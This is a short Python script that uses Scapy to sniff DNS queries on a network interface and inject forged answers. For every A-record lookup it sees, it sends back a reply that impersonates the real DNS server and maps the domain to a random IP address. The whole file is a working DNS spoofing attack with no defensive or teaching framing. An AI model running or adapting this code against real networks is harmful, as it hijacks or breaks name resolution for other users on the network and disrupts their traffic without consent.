from scapy.all import *
from pdb import set_trace # debuger python for breakpint
from pprint import pprint as pp

# DNS SPOOF TOTAL 



# domain -> ip
cache = {}

def callback(pkt):
    global cache
    if DNSQR not in pkt:
        return
    if IP not in pkt:
        return
    query = pkt[DNSQR]
    #filter only dns request type A
    if(query.qtype != 1):
        return
    

    
    target_domain = query.qname
    
    reply_ip = cache.setdefault(target_domain, str(RandIP()))

    response_packet = IP(
        src=pkt[IP].dst, 
        dst=pkt[IP].src
        ) / UDP(
            dport=pkt[UDP].sport,
            sport=pkt[UDP].dport
        ) / DNS(
            rcode="ok",
            opcode="QUERY",
            qr=1,
            qd=pkt[DNSQR],
            id=pkt[DNS].id,
            an=DNSRR(
                rrname=target_domain, 
                type="A", 
                rdata=reply_ip))

    send(response_packet)

sniff(prn=callback, filter="udp port 53" ,store=0, iface=["eno1"])